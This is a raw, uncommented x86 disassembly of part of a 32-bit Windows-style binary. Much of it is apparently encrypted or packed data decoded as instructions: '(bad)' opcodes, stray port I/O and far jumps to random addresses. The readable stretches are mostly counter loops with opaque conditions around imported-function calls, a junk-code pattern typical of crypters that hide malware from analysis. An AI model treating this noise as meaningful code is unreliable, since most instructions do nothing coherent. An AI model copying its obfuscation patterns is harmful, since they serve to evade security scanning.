  4030cf:	fcomip st,st(6)
  4030d1:	in     al,0xc4
  4030d3:	adc    BYTE PTR [ebp+0x4df32e28],al
  4030d9:	mov    edi,DWORD PTR [eax-0x7d62d470]
  4030df:	(bad)  
  4030e0:	sub    eax,0xa50fe7ec
  4030e5:	repz call 0x25b9bb3b
  4030eb:	jl     0x40313e
  4030ed:	test   DWORD PTR [edx],esi
  4030ef:	adc    al,cl
  4030f1:	lahf   
  4030f2:	imul   ebp,eax,0x1e
  4030f5:	addr16 loop 0x403119
  4030f8:	fisub  WORD PTR [edi+0x3313ba0d]
  4030fe:	xor    DWORD PTR [edi],0xffffffdc
  403101:	adc    al,0xdf
  403103:	daa    
  403104:	add    DWORD PTR [eax+0x71],edx
  403107:	push   esi
  403108:	jb     0x4030e8
  40310a:	jp     0x4030c8
  40310c:	push   ss
  40310d:	hlt    
  40310e:	dec    ecx
  40310f:	(bad)  
  403110:	push   edx
  403111:	xchg   esi,eax
  403112:	dec    ebp
  403113:	xlat   BYTE PTR ds:[ebx]
  403114:	imul   ecx,DWORD PTR [edx+0xb],0xeab9eb5b
  40311b:	mov    BYTE PTR [edx-0x180c039f],ah
  403121:	sbb    BYTE PTR [ebx+esi*2],cl
  403124:	mov    ds:0x68aebdcb,al
  403129:	add    al,0xf3
  40312b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40312d:	in     eax,0xc5
  40312f:	hlt    
  403130:	(bad)  
  403131:	in     al,0x93
  403133:	retf   
  403134:	shl    DWORD PTR [ebp+edx*2-0x3d],0x70
  403139:	jg     0x4031ab
  40313b:	cmp    edi,0x458bfe50
  403141:	enter  0xd8b,0xb0
  403145:	cmp    eax,DWORD PTR [ecx+0x0]
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x40073ea4],0x2c
  40315f:	sub    bh,BYTE PTR [edx-0x58181e9]
  403165:	jg     0x4031e5
  403167:	jle    0x403135
  403169:	xor    al,0x63
  40316b:	dec    ecx
  40316c:	addr16 inc esp
  40316e:	ss sti 
  403170:	jmp    edx
  403172:	iret   
  403173:	adc    al,0x9f
  403175:	cmp    ah,BYTE PTR [eax+0xf721a78]
  40317b:	add    DWORD PTR [ebp-0x7b],ecx
  40317e:	sub    al,0x60
  403180:	jle    0x4031b1
  403182:	call   0xdbad8d46
  403187:	and    ebx,DWORD PTR [ebx+0x13cd4795]
  40318d:	mov    eax,ds:0x8b8aff3
  403192:	repnz ins BYTE PTR es:[edi],dx
  403194:	shl    dh,cl
  403196:	js     0x403127
  403198:	or     esi,DWORD PTR [edi+0x7c6a7a68]
  40319e:	mov    cl,0xb
  4031a0:	xor    esi,DWORD PTR [eax]
  4031a2:	ins    BYTE PTR es:[edi],dx
  4031a3:	mov    eax,ds:0x938c4de4
  4031a8:	add    edx,DWORD PTR [esi-0x67]
  4031ab:	int3   
  4031ac:	sti    
  4031ad:	push   ss
  4031ae:	pop    ecx
  4031af:	xor    ch,dh
  4031b1:	sub    BYTE PTR [esi+0x3a2e508e],cl
  4031b7:	push   edi
  4031b8:	jg     0x403219
  4031ba:	sub    al,0x6c
  4031bc:	(bad)  
  4031bd:	dec    edx
  4031be:	fisttp DWORD PTR [ecx]
  4031c0:	jg     0x4031f9
  4031c2:	retf   0xd6
  4031c5:	leave  
  4031c6:	in     eax,0x4c
  4031c8:	xchg   edx,eax
  4031c9:	jmp    FWORD PTR [eax+0x4c]
  4031cc:	pop    edx
  4031cd:	jmp    0x6a2b2a6f
  4031d2:	and    bh,0xc7
  4031d5:	mov    dh,0x57
  4031d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031d8:	jnp    0x4031b7
  4031da:	hlt    
  4031db:	sar    DWORD PTR [edx+eax*2+0xd],0xd0
  4031e0:	dec    edi
  4031e1:	out    0xb7,eax
  4031e3:	xchg   ecx,eax
  4031e4:	fst    DWORD PTR [edi+0x5b520057]
  4031ea:	jle    0x4031b0
  4031ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031ed:	call   0x93d0fb47
  4031f2:	mov    al,BYTE PTR [edx-0x3922b417]
  4031f8:	lods   eax,DWORD PTR ds:[esi]
  4031f9:	push   ds
  4031fa:	push   ds
  4031fb:	and    ah,dh
  4031fd:	mov    eax,0xb9e3b0e8
  403202:	push   edx
  403203:	outs   dx,BYTE PTR ds:[esi]
  403204:	retf   
  403205:	pop    eax
  403206:	out    0x93,eax
  403208:	jp     0x4031a5
  40320a:	imul   eax,DWORD PTR [ecx+0x69],0xffffffc3
  40320e:	sub    bh,BYTE PTR [edx+0x4]
  403211:	neg    DWORD PTR [edx]
  403213:	mov    esp,0xe5960d13
  403218:	out    0x25,eax
  40321a:	push   0xa473060e
  40321f:	ins    BYTE PTR es:[edi],dx
  403220:	jne    0x4031a8
  403222:	cwde   
  403223:	mov    dl,0x3f
  403225:	xor    ebx,ebp
  403227:	ds pushf 
  403229:	jp     0x40327f
  40322b:	jle    0x403211
  40322d:	mov    al,ds:0xa93e3b78
  403232:	mov    esp,0xb7c34b67
  403237:	out    0x2d,al
  403239:	fwait
  40323a:	cmp    dh,BYTE PTR [esi+0x2d]
  40323d:	push   esp
  40323e:	stos   BYTE PTR es:[edi],al
  40323f:	cmp    al,0xf9
  403241:	push   0x33
  403243:	stos   DWORD PTR es:[edi],eax
  403244:	xchg   ebp,eax
  403245:	pop    esp
  403246:	lock in eax,dx
  403248:	pop    ebx
  403249:	xor    edx,DWORD PTR [ebp-0x77]
  40324c:	aaa    
  40324d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40324e:	inc    esp
  40324f:	jmp    0x4298:0x393671d
  403256:	lods   al,BYTE PTR ds:[esi]
  403257:	mov    ds:0xf0fccd08,al
  40325c:	xchg   DWORD PTR [esi+0x35],edx
  40325f:	jae    0x4032a0
  403261:	aaa    
  403262:	pop    ss
  403263:	mov    ds:0x33134454,al
  403268:	rol    DWORD PTR [eax-0x354910dc],0x42
  40326f:	mov    al,ds:0x44e63b94
  403274:	push   ebp
  403275:	ds cmp dh,ah
  403278:	es and dh,ch
  40327b:	(bad)  
  40327c:	jns    0x40323f
  40327e:	sub    eax,0x2a8e5ea4
  403283:	adc    BYTE PTR [edi+0x79e99500],cl
  403289:	lea    ecx,[edx-0x60]
  40328c:	push   ebp
  40328d:	pop    ss
  40328e:	and    al,0xfd
  403290:	xor    BYTE PTR [ebx+0x388f7208],ah
  403296:	gs dec ebx
  403298:	dec    ebx
  403299:	aaa    
  40329a:	shl    DWORD PTR [esi],cl
  40329c:	adc    al,0x62
  40329e:	push   0x2b9b2008
  4032a3:	and    eax,0xd91f58c6
  4032a8:	lahf   
  4032a9:	es mov ebx,0x55cb59fb
  4032af:	inc    ebp
  4032b0:	jl     0x403274
  4032b2:	dec    ebp
  4032b3:	jno    0x4032ed
  4032b5:	mov    al,ds:0x63e1c1fe
  4032ba:	outs   dx,DWORD PTR ds:[esi]
  4032bb:	cmp    BYTE PTR [esi+0x5bd95469],0xaa
  4032c2:	cmp    eax,0x80007861
  4032c7:	dec    ebp
  4032c8:	mov    edi,DWORD PTR [bp+0x1f]
  4032cc:	ds mov edi,0x3e19735e
  4032d2:	xchg   esi,eax
  4032d3:	dec    esi
  4032d4:	aad    0x43
  4032d6:	popa   
  4032d7:	data16 mov bh,0x77
  4032da:	ins    DWORD PTR es:[edi],dx
  4032db:	loope  0x4032fb
  4032dd:	jno    0x4032ac
  4032df:	fmul   QWORD PTR [edx]
  4032e1:	pop    ebp
  4032e2:	and    BYTE PTR [edi+0x5505e99c],0x63
  4032e9:	and    eax,0x5b5e11bd
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x4253d48a]
  403537:	sbb    ebp,DWORD PTR [ebp-0x3a]
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	cmp    eax,0xac3a6a2
  403546:	sbb    ch,BYTE PTR [ebp-0x48]
  403549:	adc    al,0x8d
  40354b:	fdivr  st(7),st
  40354d:	hlt    
  40354e:	ret    0x3a79
  403551:	fld    TBYTE PTR [ebx+0x2f9ad45b]
  403557:	push   esp
  403558:	inc    ebx
  403559:	std    
  40355a:	cmp    bh,BYTE PTR [ecx-0x45]
  40355d:	pop    ebx
  40355e:	(bad)  [esi]
  403560:	dec    esi
  403561:	cwde   
  403562:	lods   eax,DWORD PTR ds:[esi]
  403563:	retf   0x80b0
  403566:	ins    DWORD PTR es:[edi],dx
  403567:	jno    0x40351f
  403569:	je     0x403559
  40356b:	xchg   BYTE PTR [ecx+0x8],ah
  40356e:	inc    ebp
  40356f:	inc    ecx
  403570:	pop    eax
  403571:	mov    ebx,edi
  403573:	dec    edi
  403574:	and    BYTE PTR [ebx],cl
  403576:	popa   
  403577:	or     al,0x20
  403579:	pop    es
  40357a:	or     ch,dl
  40357c:	fild   WORD PTR ds:0xfc420a74
  403582:	add    DWORD PTR [esi+0x79],esp
  403585:	adc    eax,0xeb8744d9
  40358a:	ds jge 0x40359c
  40358d:	call   0xabd1:0x1aceb9f3
  403594:	aas    
  403595:	cmp    al,0xb9
  403597:	sbb    DWORD PTR [ecx+0x5c],ebp
  40359a:	dec    esp
  40359b:	dec    edi
  40359c:	cs (bad) 
  40359e:	mov    esi,0x23ba17cc
  4035a3:	lods   al,BYTE PTR ss:[esi]
  4035a5:	cli    
  4035a6:	mov    bh,0xc2
  4035a8:	mov    al,ds:0xba88980
  4035ad:	es fcmovb st,st(2)
  4035b0:	ror    ch,cl
  4035b2:	push   cs
  4035b3:	sub    eax,0x9d03d960
  4035b8:	mov    al,ds:0x6cd27217
  4035bd:	ret    
  4035be:	mov    ebx,0x35435089
  4035c3:	mov    edi,0x3994918c
  4035c8:	dec    edi
  4035c9:	inc    ebx
  4035ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035cb:	xchg   esp,eax
  4035cc:	out    dx,eax
  4035cd:	mov    edi,edx
  4035cf:	mov    al,0xd0
  4035d1:	pop    esi
  4035d2:	pop    esi
  4035d3:	fmul   DWORD PTR [ebx+edi*8-0x7d5d988f]
  4035da:	inc    edx
  4035db:	dec    esp
  4035dc:	js     0x4035ab
  4035de:	std    
  4035df:	shr    DWORD PTR [ebx],1
  4035e1:	sbb    al,0xa4
  4035e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e4:	sahf   
  4035e5:	loop   0x40362b
  4035e7:	sbb    cl,BYTE PTR [eax]
  4035e9:	xchg   edi,eax
  4035ea:	and    dl,ah
  4035ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ed:	pushf  
  4035ee:	cmp    bl,dh
  4035f0:	sbb    BYTE PTR [edi-0x7c3ecada],dl
  4035f6:	loopne 0x40366c
  4035f8:	and    DWORD PTR [ebp+esi*1+0x33],0x56
  4035fd:	pusha  
  4035fe:	enter  0xe036,0x11
  403602:	je     0x40359f
  403604:	cmp    BYTE PTR [ebx-0x51],0xaf
  403608:	pop    ecx
  403609:	jmp    0x403611
  40360b:	pop    esp
  40360c:	xor    edi,esi
  40360e:	test   ax,0xca0c
  403612:	add    BYTE PTR [esi-0x2d2f1f6b],bh
  403618:	rol    esp,1
  40361a:	sahf   
  40361b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40361c:	(bad)  
  40361d:	jo     0x403644
  40361f:	and    BYTE PTR [ecx+0x958529d],al
  403625:	retf   0x554d
  403628:	cdq    
  403629:	iret   
  40362a:	sub    eax,0xbf1f4631
  40362f:	adc    ebx,ebp
  403631:	push   esp
  403632:	mov    ah,0x61
  403634:	pop    ds
  403635:	sbb    eax,DWORD PTR [edi+0x7c9af0ee]
  40363b:	push   edi
  40363c:	adc    dl,BYTE PTR [eax]
  40363e:	or     DWORD PTR [ecx-0x5b5e2587],edi
  403644:	sub    BYTE PTR [edx-0x67],bh
  403647:	dec    ebp
  403648:	mov    bl,0x3a
  40364a:	stos   BYTE PTR es:[edi],al
  40364b:	ins    DWORD PTR es:[edi],dx
  40364c:	test   ecx,ebx
  40364e:	and    bh,BYTE PTR [esp+eiz*2-0x25]
  403652:	popa   
  403653:	or     DWORD PTR [ebp-0x56760984],ebx
  403659:	in     eax,dx
  40365a:	ins    BYTE PTR es:[edi],dx
  40365b:	xor    edx,0xf2c897c
  403661:	mov    cl,0x4d
  403663:	jg     0x4036dc
  403665:	pop    eax
  403666:	rcl    BYTE PTR [ecx+edx*1],1
  403669:	pop    edi
  40366a:	mul    DWORD PTR [edi]
  40366c:	lea    esi,[esi-0x35]
  40366f:	mov    cl,dl
  403671:	shl    BYTE PTR [edi],0x58
  403674:	mov    esi,0x22e7895c
  403679:	ins    DWORD PTR es:[edi],dx
  40367a:	dec    ebp
  40367b:	stc    
  40367c:	push   ebp
  40367d:	loop   0x4036e9
  40367f:	ds adc ah,bh
  403682:	mov    ebp,0xf0160883
  403687:	daa    
  403688:	push   ss
  403689:	outs   dx,BYTE PTR ds:[esi]
  40368a:	iret   
  40368b:	dec    edi
  40368c:	mov    bl,0x63
  40368e:	retf   
  40368f:	xchg   BYTE PTR [edi-0x4f651f70],dh
  403695:	scas   al,BYTE PTR es:[edi]
  403696:	mov    ah,0xdd
  403698:	daa    
  403699:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40369a:	int    0x28
  40369c:	ror    DWORD PTR [edx+0x3ebea9ef],cl
  4036a2:	iret   
  4036a3:	xchg   ecx,eax
  4036a4:	jnp    0x403681
  4036a6:	repnz sub BYTE PTR [edi-0x2fef996f],ah
  4036ad:	xor    eax,ebx
  4036af:	cli    
  4036b0:	and    ch,ch
  4036b2:	push   0xffffffc2
  4036b4:	test   ah,cl
  4036b6:	call   0x8efe:0x311fa8f5
  4036bd:	fst    QWORD PTR [ecx+ecx*4]
  4036c0:	jns    0x4036a7
  4036c2:	inc    eax
  4036c3:	inc    edi
  4036c4:	cmp    dh,BYTE PTR ds:[edx+ebx*8]
  4036c8:	jle    0x403739
  4036ca:	call   0x46877a05
  4036cf:	out    0x62,eax
  4036d1:	int    0x9d
  4036d3:	dec    edi
  4036d4:	sub    al,0x30
  4036d6:	or     edx,DWORD PTR [eax]
  4036d8:	jle    0x40373d
  4036da:	mov    bl,0xa2
  4036dc:	mov    edi,0xef7e1407
  4036e1:	sub    ebx,DWORD PTR ds:0x1e8c4b1f
  4036e7:	into   
  4036e8:	cmp    bh,BYTE PTR [edx+0x1]
  4036eb:	mov    ecx,0x4f33e93e
  4036f0:	cmp    BYTE PTR [edi+0x28],0xb
  4036f4:	add    esi,DWORD PTR [edi+0x1d]
  4036f7:	xchg   esi,eax
  4036f8:	pop    ecx
  4036f9:	les    esp,FWORD PTR [eax+edx*4-0x39]
  4036fd:	dec    ebp
  4036fe:	push   ebx
  4036ff:	rol    DWORD PTR [esp+edi*8-0x6c79124f],1
  403706:	push   ebp
  403707:	lss    ecx,FWORD PTR ds:[edi-0x42a811a0]
  40370f:	dec    ebx
  403710:	mov    esp,0xa4ac85a4
  403715:	add    BYTE PTR [eax+0x6c],cl
  403718:	jo     0x4036d4
  40371a:	push   ss
  40371b:	into   
  40371c:	retf   0x9792
  40371f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  403721:	in     eax,dx
  403722:	fstp   st(1)
  403724:	loop   0x403768
  403726:	je     0x40377e
  403728:	sbb    bl,BYTE PTR [edi-0x4e3a58df]
  40372e:	sti    
  40372f:	jmp    0x40379c
  403731:	inc    edx
  403732:	push   0x20f96db9
  403737:	sub    eax,0xf2ddd82d
  40373c:	addr16 push edx
  40373e:	lock dec eax
  403740:	mov    ch,0x5c
  403742:	cmp    eax,0xcba983ab
  403747:	call   FWORD PTR [eax-0x36]
  40374a:	mov    dh,0x72
  40374c:	sub    al,0xe5
  40374e:	in     al,0x59
  403750:	js     0x403706
  403752:	in     al,dx
  403753:	out    0xb9,al
  403755:	into   
  403756:	popa   
  403757:	enter  0x6eec,0x9f
  40375b:	aaa    
  40375c:	std    
  40375d:	dec    ecx
  40375e:	lods   eax,DWORD PTR ds:[esi]
  40375f:	xor    eax,0x4920b337
  403764:	mov    ah,0x4c
  403766:	in     al,0xef
  403768:	cmp    WORD PTR [edi+0x41],di
  40376c:	leave  
  40376d:	rcr    BYTE PTR [esi+0x5e],0xbc
  403771:	xor    bh,al
  403773:	push   ebp
  403774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403775:	lock call 0x4a2e:0xca093bd5
  40377d:	or     al,0x87
  40377f:	mov    ds:0xcbdc6da1,eax
  403784:	lods   al,BYTE PTR ds:[esi]
  403785:	mov    bh,0xe3
  403787:	hlt    
  403788:	jnp    0x4037c9
  40378a:	mov    ecx,0x8f7652aa
  40378f:	adc    bh,al
  403791:	jnp    0x40375e
  403793:	cmp    dh,ah
  403795:	sbb    ch,ch
  403797:	and    BYTE PTR [ecx-0x2e7cbf3d],0xfc
  40379e:	or     al,0x32
  4037a0:	adc    DWORD PTR [ebx+0x33],ebp
  4037a3:	gs mov edx,0xe9117413
  4037a9:	aam    0xa3
  4037ab:	and    esp,DWORD PTR [edi-0x33]
  4037ae:	pop    eax
  4037af:	adc    eax,0x11364de8
  4037b4:	and    al,0xce
  4037b6:	les    ebp,FWORD PTR [eax]
  4037b8:	mov    gs,WORD PTR ds:0x5ed757a3
  4037be:	xor    eax,0x80ee7a9f
  4037c3:	psadbw mm7,QWORD PTR [eax-0xc6b4c5a]
  4037ca:	pop    ebx
  4037cb:	sub    BYTE PTR ds:0x16aee29,ch
  4037d1:	mov    eax,ds:0xa6245d13
  4037d6:	push   0x24fb4067
  4037db:	mov    dl,cl
  4037dd:	out    dx,eax
  4037de:	jmp    0x968a7ab5
  4037e3:	int3   
  4037e4:	xlat   BYTE PTR ds:[ebx]
  4037e5:	xchg   esi,eax
  4037e6:	xchg   esp,eax
  4037e7:	jecxz  0x4037b3
  4037e9:	leave  
  4037ea:	iret   
  4037eb:	in     al,dx
  4037ec:	push   esp
  4037ed:	out    dx,eax
  4037ee:	scas   eax,DWORD PTR es:[edi]
  4037ef:	and    esi,ebp
  4037f1:	sub    al,0x40
  4037f3:	mov    WORD PTR [ebp+0x0],ss
  4037f6:	gs mov ebx,0x55bc142c
  4037fc:	inc    edx
  4037fd:	or     eax,0x66523ee3
  403802:	mov    dh,0x56
  403804:	mov    dl,0x5d
  403806:	(bad)  
  403807:	mov    dl,0xac
  403809:	push   esp
  40380a:	cmp    DWORD PTR [edx+ecx*8+0x6a],edi
  40380e:	jg     0x403873
  403810:	ret    
  403811:	pop    edi
  403812:	cmp    ch,BYTE PTR [ebp-0x96b7e95]
  403818:	and    BYTE PTR [edx+esi*8+0x7e],0x3d
  40381d:	mov    dl,0x22
  40381f:	imul   ebx,DWORD PTR [edi-0x19],0x4aaa792c
  403826:	out    0xc7,al
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x36fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	aaa    
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43382725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4337d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4337d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
